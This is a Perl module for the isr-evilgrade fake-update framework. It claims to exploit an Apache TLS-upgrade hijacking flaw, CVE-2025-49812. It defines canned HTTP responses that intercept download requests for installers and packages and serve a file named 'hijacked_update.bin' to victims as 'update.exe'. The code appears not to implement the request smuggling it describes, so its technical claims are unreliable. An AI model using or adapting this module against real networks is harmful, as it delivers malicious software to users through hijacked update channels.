###############
# apache_tls_hijack.pm
#
# CVE-2025-49812: Apache HTTP/HTTPS desynchronization attack
# Allows TLS upgrade hijacking and session takeover
# Enables MITM attack on software updates during TLS negotiation
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::apache_tls_hijack;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'Apache HTTP Upgrade Hijack',
    'version'     => '1.0',
    'appver'      => 'httpd 2.4 < 2.4.64',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2025-49812: HTTP request smuggling via desynchronization.
Allows hijacking of TLS upgrade mechanisms to intercept update requests.
Useful for intercepting software updates during HTTP->HTTPS upgrade.
Affects Apache httpd with SSLEngine optional configuration.
    },
    'vh' => '(.*\.com|.*\.org|downloads\.*|updates\.)',
    'request' => [
        {
            'req'   => '/.*\\.(exe|msi|deb|rpm).*HTTP/1.1',
            'type'  => 'string',
            'string' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Length: 1048576\r\n"
                . "Connection: Upgrade\r\n"
                . "Upgrade: TLS/1.2\r\n\r\n",
            'parse' => 1,
        },
        {
            'req'   => '.*Upgrade: TLS',
            'type'  => 'string',
            'string' => "HTTP/1.1 101 Switching Protocols\r\n"
                . "Upgrade: TLS/1.2\r\n"
                . "Connection: Upgrade\r\n\r\n",
            'parse' => 1,
        },
        {
            'req'   => '/downloads/.*',
            'type'  => 'file',
            'file'  => './include/apache/hijacked_update.bin',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=update.exe\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
